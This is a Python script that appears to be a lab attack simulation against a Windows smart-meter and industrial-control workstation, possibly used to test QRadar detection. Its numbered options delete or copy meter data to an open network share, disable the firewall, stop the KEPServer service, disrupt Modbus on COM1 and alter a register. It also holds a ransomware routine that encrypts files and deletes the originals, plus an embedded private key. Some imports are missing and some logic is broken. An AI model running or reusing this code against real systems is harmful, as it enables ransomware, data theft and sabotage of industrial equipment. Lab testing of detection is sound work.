from os import walk, path, remove, system, getcwd, mkdir
import threading
from shutil import copyfile
from subprocess import run, check_call, CalledProcessError, PIPE
from ctypes import windll
from sys import executable, argv
from win32netcon import ACCESS_ALL
from win32net import NetShareAdd

copiedpath = "C:\\Windows\\temp\\Smartmeter" # Put shared directory
smartmeterpath = "C:\\Users\\Student\\Documents\\SmartMeterData"

#Check if administrator
def check_admin():
    try:
        isAdmin = windll.shell32.IsUserAnAdmin()
    except AttributeError:
        isAdmin = False
    if not isAdmin:
        windll.shell32.ShellExecuteW(None, "runas", executable, __file__, None, 1)

#Delete file in specific folder
def delete_files(folder_path):
    for root, dirs, files in walk(folder_path):
        for file in files:
            og = path.join(root, file)
            dest = path.join(copiedpath, file)
            remove(og)
            print("File: " + str(og) + " is deleted")

def copy_file(folder_path):
    for root, dirs, files in walk(folder_path):
        for file in files:
            og = path.join(root, file)
            dest = path.join(copiedpath, file)
            copyfile(og,dest)
            print("File: " + str(og) + " is copied")

    

#Disable firewall
def disable_firewall():
    cp = run('netsh advfirewall set allprofiles state off',stdout=PIPE , shell=True)
    if cp.stdout.decode('utf-8').strip() == "Ok.":
        print("Firewall disabled successfully")
    else:
        print("Firewall failed to disable")

#Disable ssh from firewall
def disable_ssh():
    cp = run('netsh advfirewall firewall add rule name="QRadar Test" dir=in action=block protocol=TCP localport=22',stdout=PIPE)
    if cp.stdout.decode('utf-8').strip() == "Ok.":
        print("Inbound Firewall Successfully Inserted (Blocked: TCP/22)")
    else:
        print("Inbound Firewall Failed to be Inserted")
    cp = run('netsh advfirewall firewall add rule name="QRadar Test 2" dir=in action=block protocol=UDP localport=22',stdout=PIPE)
    if cp.stdout.decode('utf-8').strip() == "Ok.":
        print("Inbound Firewall Successfully Inserted (Blocked: UDP/22)")
    else:
        print("Inbound Firewall Failed to be Inserted")
    cp = run('netsh advfirewall firewall add rule name="QRadar Test 3" dir=out action=block protocol=TCP localport=22',stdout=PIPE)
    if cp.stdout.decode('utf-8').strip() == "Ok.":
        print("Outbound Firewall Successfully Inserted (Blocked: TCP/22)")
    else:
        print("Outbound Firewall Failed to be Inserted")
    cp = run('netsh advfirewall firewall add rule name="QRadar Test 4" dir=out action=block protocol=UDP localport=22',stdout=PIPE)
    if cp.stdout.decode('utf-8').strip() == "Ok.":
        print("Outbound Firewall Successfully Inserted (Blocked: UDP/22)")
    else:
        print("Outbound Firewall Failed to be Inserted")

#Disable Kepserver Service
def disable_kepserver():
    service_name = "KEPServerEXV6"
    cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
    output = cp.stdout.decode('utf-8').strip().split()
    if "FAILED" in cp.stdout.decode('utf-8'):
            print("FAILED: " + " ".join(output[4:]))
    else:
        print("The " + output[1] + " service is " + output[9])

#Run modpoll to interrupt COM1 port
def run_modinterrup():
    current_directory = getcwd()
    executable_path = current_directory + "\\modpoll.exe"
    parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "2", "COM1"]
    try:
        check_call([executable_path] + parameters)
    except CalledProcessError as e:
        print("Error executing the executable file:", e)

#Disable COM Port
def disable_COMPort():
    cp = run(["C:\Windows\System32\pnputil.exe", "/enum-devices", "/class", "Ports"],stdout=PIPE ,shell=True)
    dump = cp.stdout.split()
    deviceID = ""
    deviceArr = []
    for i in range(0, len(dump)):
        if dump[i].decode("utf-8") == "ID:":
            deviceID = dump[i+1].decode("utf-8")
            deviceArr.append(deviceID)
            print(str(len(deviceArr)) + " : " + deviceID)
    userInput = input("Choose device to disable, e.g. 1, 2, 3 \n")
    batchscript = "\"C:\\Windows\\System32\\pnputil.exe\" \"/disable-device\" \"" + deviceArr[int(userInput)-1] + "\""
    with open("script.bat", "w") as f:
        f.write(batchscript)
    cp = run(["script.bat"],stdout=PIPE ,shell=True)
    print(cp.stdout.decode('utf-8'))
    remove("script.bat")

#Create Shared Folder
def Create_Share_folder():
    folder_path = r'C:\Windows\temp\Smartmeter'

    # Create the folder if it does not already exist
    if not path.exists(folder_path):
        mkdir(folder_path)

    netshare = run(['net', 'share'], stdout=PIPE, stderr=PIPE, text=True)
    if "SmartMeterfolder" in netshare.stdout:
        print ("SmartMeterfolder has already been shared.")
    else:
        # Set the share information
        share_name = 'SmartMeterfolder'
        share_path = folder_path
        share_remark = 'Shared folder for full access'

        # Create the share
        share_info = {
            'netname': share_name,
            'path': share_path,
            'remark': share_remark,
            'max_uses': -1,
            'current_uses': 0,
            'permissions': ACCESS_ALL,
            'security_descriptor': None
        }
        NetShareAdd(None, 2, share_info)
        print ("SmartMeterfolder has been shared.")

def encrypt_Files():
    #public key
    pubKey = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxZUs0TkppUGlaQ1o0aDRwM2lzNwpyOTdTRGRnaWtrckswNE1sc3oraHY2UmIxKzB2M1hsY296QXVGeGIvMjkxTE5tNGs1M1RZTXQ4M3BPRm9ZRTh4Ckx0VE55UVNSMDR2dzBGcGRwU3Y1YVVjbysxRmtwRjRMdCtqV1Q0YjVrTUFqWTRkOW5Yb3lRQmxJbzBWckMwQzIKcldpeklONGV1TXBTbll3V2Z0a2JsZE5qcDJ1U0hFeWM1Z0FZR1ZKSWZ6TVRiaUxZd0k5aU9rNllnWEozbWJLdAp1dHo2WlRTdlplVzEwaUhrc2JXUXgvcUVjR0JLWFJUbkUvYTJkZVhvRThRaFZOTUV5Z0xVQmF3NERYaWRCbXBiCnFmSWtvZk5UWlQ3K2NyaENocVptYmFrSjA5bTdmT3k1TURud0oraU0wdlBheW1tdGduWnBrR0NQNlpDVDlkeHoKcHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''
    pubKey = base64.b64decode(pubKey)

    #directory to encrypt
    directory = 'C://Users//Student//Documents//ransomwareTest'
    #exclude extensions
    excludeExtension = ['.py','.pem', '.exe']

    for item in recurseFiles(directory): 
        filePath = Path(item)
        fileType = filePath.suffix.lower()

        if fileType in excludeExtension:
            continue
        encrypt(filePath, pubKey)
        print("Encrypted: " + str(filePath))

def encrypt(dataFile, publicKey):
    '''
    Input: path to file to encrypt, public key
    Output: encrypted file with extension .L0v3sh3 and remove original file
    use EAX mode to allow detection of unauthorized modifications
    '''
    # read data from file
    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)
    with open(dataFile, 'rb') as f:
        data = f.read()
    
    # convert data to bytes
    data = bytes(data)

    # create public key object
    key = RSA.import_key(publicKey)
    sessionKey = urandom(16)

    # encrypt the session key with the public key
    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)

    # encrypt the data with the session key
    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    # save the encrypted data to file
    fileName= dataFile.split(extension)[0]
    fileExtension = '.encrypted'
    encryptedFile = fileName + fileExtension
    with open(encryptedFile, 'wb') as f:
        [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
    remove(dataFile)

def recurseFiles(baseDirectory):
    #Scan a directory and return a list of all files
    for entry in scandir(baseDirectory):
        if entry.is_file():
            yield entry
        else:
            yield from recurseFiles(entry.path)

def decrypt(dataFile, privatekey):
    '''
    use EAX mode to allow detection of unauthorized modifications
    '''
    with open("private.pem", 'w+') as f:
        f.write(privatekey)

    # read private key from file
    with open("private.pem", 'rb') as f:
        privateKey = f.read()
        # create private key object
        key = RSA.import_key(privateKey)

    # read data from file
    with open(dataFile, 'rb') as f:
        # read the session key
        encryptedSessionKey, nonce, tag, ciphertext = [ f.read(x) for x in (key.size_in_bytes(), 16, 16, -1) ]

    # decrypt the session key
    cipher = PKCS1_OAEP.new(key)
    sessionKey = cipher.decrypt(encryptedSessionKey)

    # decrypt the data with the session key
    cipher = AES.new(sessionKey, AES.MODE_EAX, nonce)
    data = cipher.decrypt_and_verify(ciphertext, tag)

    # save the decrypted data to file
    [ fileName, fileExtension ] = str(dataFile).split('.')
    decryptedFile = fileName + '_decrypted.csv'
    with open(decryptedFile, 'wb') as f:
        f.write(data)

    print('Decrypted file saved to ' + decryptedFile)

#Run modpoll to change register 40201 to 26
def test():
    current_directory = getcwd()
    executable_path = current_directory + "\\modpoll.exe"
    parameters = ["-r", "40201", "COM1", "26"]
    try:
        check_call([executable_path] + parameters)
    except CalledProcessError as e:
        print("Error executing the executable file:", e)

def revert(revertoption):
    # 1 To enable firewall, 2 to remove firewall rule, 3 to re-enable KEPService, 4 to re-enable comport, 5 to decrypt files, 6 to change register 40201 back to 25
    if revertoption == "1":
        cp = run('netsh advfirewall set allprofiles state on',stdout=PIPE , shell=True)
        if cp.stdout.decode('utf-8').strip() == "Ok.":
            print("Firewall enabled successfully")
        else:
            print("Firewall failed to enable")
        
    elif revertoption == "2":
        cp = run('netsh advfirewall firewall delete rule name="QRadar Test"',stdout=PIPE)
        if "Ok." in cp.stdout.decode('utf-8'):
            print("Inbound Firewall Successfully Removed (Un-Blocked: TCP/22)")
        else:
            print("Inbound Firewall Not Removed (TCP/22)")
        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 2"',stdout=PIPE)
        if "Ok." in cp.stdout.decode('utf-8'):
            print("Inbound Firewall Successfully Removed (Un-Blocked: UDP/22)")
        else:
            print("Inbound Firewall Not Removed (UDP/22)")
        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 3"',stdout=PIPE)
        if "Ok." in cp.stdout.decode('utf-8'):
            print("Outbound Firewall Successfully Removed (Un-Blocked: TCP/22)")
        else:
            print("Outbound Firewall Not Removed (TCP/22)")
        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 4"',stdout=PIPE)
        if "Ok." in cp.stdout.decode('utf-8'):
            print("Outbound Firewall Successfully Removed (Un-Blocked: UDP/22)")
        else:
            print("Outbound Firewall Not Removed (UDP/22)")
        
    elif revertoption == "3":
        service_name = "KEPServerEXV6"
        cp = run(["sc", "start", service_name],stdout=PIPE , check=False)
        output = cp.stdout.decode('utf-8').strip().split()
        if "FAILED" in cp.stdout.decode('utf-8'):
            print("FAILED: " + " ".join(output[4:]))
        else:
            print("The " + output[1] + " service is " + output[9])
        
    elif revertoption == "4":
        cp = run(["C:\Windows\System32\pnputil.exe", "/enum-devices", "/class", "Ports"],stdout=PIPE ,shell=True)
        dump = cp.stdout.split()
        deviceID = ""
        deviceArr = []
        for i in range(0, len(dump)):
            if dump[i].decode("utf-8") == "ID:":
                deviceID = dump[i+1].decode("utf-8")
                deviceArr.append(deviceID)
                print(str(len(deviceArr)) + " : " + deviceID)
        userInput = input("Choose device to re-enable, e.g. 1, 2, 3 \n")
        batchscript = "\"C:\\Windows\\System32\\pnputil.exe\" \"/enable-device\" \"" + deviceArr[int(userInput)-1] + "\""
        with open("script.bat", "w") as f:
            f.write(batchscript)
        cp = run(["script.bat"],stdout=PIPE ,shell=True)
        print(cp.stdout.decode('utf-8'))
        remove("script.bat")

    elif revertoption == "5":
        privatekey = '''-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA6bgvahtvppczlz5oohPU/2D81huNsz5VfSGxtE5TICh0npaG
/AngulN/gRDEo2W/ZUiu9cmanfDQUReTS0ECs0W4AHN53fPWvtdcsX4zD9ydgurt
EAyJxAdKzNpNH8Iber/Jo0CFfW/eNITDDk2OTe2xkKS1uG8jOGz4f45FC+q5ky/U
cqWktAPnxArUBeApDl6LcAMc1wlfOWD3S9dpyeoMc1zvyWRQEkWQ7cs+eXovix2m
8t5VorMc+H8LuVX+GiMWfdC4SLQEw2/UXBOELnbVUAnT2d/uh7MsknhR2KBNQODv
sJmMGDPQZtK5svJuwtcGaak/mspJ7IOKcVNt3wIDAQABAoIBAAF5gYcUXDx7WL58
DNH0+RORa5b4PokifAyZkVL3aYva5X14qqpdb5cNXtEUJ4F2a2I6tqvjVT/o3I+e
a/X+F4PFDVenYt31I2Y52qJeDvlrJW1FiTBgO+BKQX0QZYstQNoh6qZGinETqx2+
trJY5+xy8vtcJq9euCSrf1fisGnWUrVv36QEiXM52dWHVKCFsV4zOEM3eIUZ8WZb
65MIPwAG9Qj/GRXfmlgCGnLOvcEZuBayVX4DZ8ELex7jFaNt/dxeOIKPSBps3fcn
GAGTcxYnnUAOgquj6ixFZt9E0aU84+OwsMtis1wG5lOusEhyHz66eP9x097Vve4O
/35VVn0CgYEA6eG2TufnlU6U5harOapmIuZrQeuZHlCqGBMTjY+tBY6eqiTocYPI
Rj3/+CuW1c/hX2xXmRXPUaJKvnJvmKro4VML8c9j4YHRbLX+2Az0xPTvkMiun4/0
Y6f7ECiBRGwZiTItR0e/ft7ByeRoqTks0yc2zEctHFbX94+4D7SEL0MCgYEA/9KL
vLWpB83gQ/7+TpuqYdmURxSFZd7tXKGdoN1mHXwEdTfGeVY1cSalRnkIaf+rRN+s
Po7OJ1JLKzg8UZ2rJxRtlX6S0CXvqa9M+qf9NvT+MdmJL9yYY3IXXVB2pCQRrRnL
z/wzq5MOIWPCTuwOPAx6UlS9kV2R4wwL1Yp09zUCgYEAzn/Df5eyGVnwjdamB5wz
4cygFuv1nZaLGAZ/1RVuJuHtpTxBHzjDs4E6Z9vUqaOJ0b7O+RMQoXsxk0Vm0tzU
EV5JxY7fGVSNm/Z0tD18QAojGyqVQ7zOgs7mFTYuLENlqITtBWqL4XC8mY1Z+0/I
DAcrkuGlKshiluoGEZfIvhECgYAt062slG4/M6YlCBzOQBx5gtyJDygGY7TpjxoJ
ox+T0I+L3/3x5nuUVXPt9+iF9ILdx6O3YSWU7a0BhQVpKXFrgsFOsmniV6ljIEAN
9uHpYmHW1D07Ea1KwzlkQfG+3ac89w4HqAophiJV4OUB9k9memW/Mebzj2t+3L2R
90eUsQKBgHy/LhN/Mjuh7F0oP0pWoJJWXFW7Q9rqzC6Ev1VXMk4sYjNyBzWB144f
mae/+O5k4uXziLwNSyUmB9GiIEgloABmQIxOez7yez5XD2kfw+PUqcelVD2z+zI2
4OAdDMfj6v+BO6v4CKVP0rdYYuwzZ4OaoP+aR41gJiM5ut0aZca6
-----END RSA PRIVATE KEY-----'''
        directory = "C://Users//Student//Documents//ransomwareTest" # CHANGE THIS
        excludeExtension = ['.py','.pem', '.exe'] # CHANGE THIS
        for item in recurseFiles(directory): 
            filePath = Path(item)
            fileType = filePath.suffix.lower()

            if fileType in excludeExtension:
                continue
            decrypt(filePath, privatekey)
        remove("private.pem")

    elif revertoption == "6":
        current_directory = getcwd()
        executable_path = current_directory + "\\modpoll.exe"
        parameters = ["-r", "40201", "COM1", "25"]
        try:
            check_call([executable_path] + parameters)
        except CalledProcessError as e:
            print("Error executing the executable file:", e)
        else:
            print ("Invalid Option!")

if __name__ == '__main__':
    check_admin()
    attackoption = str(argv[1])
    if attackoption == "1":
        delete_files(smartmeterpath)
    elif attackoption == "2":
        Create_Share_folder()
        copy_file(smartmeterpath)
    elif attackoption == "3":
        disable_firewall()
    elif attackoption == "4":
        disable_ssh()
    elif attackoption == "5":
        disable_kepserver()
    elif attackoption == "6":
        run_modinterrup()
    elif attackoption == "7":
        disable_COMPort()
    elif attackoption == "8":
        encrypt_Files()
    elif attackoption == "9":
        revertoption = str(argv[2])
        revert(revertoption)
    elif attackoption == "-h":
        print("\nChoose 1 to delete file, 2 to copy file, 3 to disable firewall, 4 to disable ssh through firewall, 5 to disable Kepserver, 6 to interrup modbus reading, 7 to disable COMPORT, 8 to encrypt files, 9 to revert with options.")
    elif attackoption == "10":
        test()
    else:
        print ("Invalid Option!")
